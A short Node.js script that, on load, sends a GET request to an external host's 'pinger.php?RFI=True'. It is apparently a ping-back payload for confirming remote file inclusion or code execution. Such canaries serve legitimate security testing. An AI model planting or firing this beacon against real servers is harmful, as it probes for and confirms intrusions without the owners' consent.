var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

function pingBack() {
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "https://cloudcmd.mybluemix.net/pinger.php?RFI=True", true);
  xhttp.send();
}

pingBack();
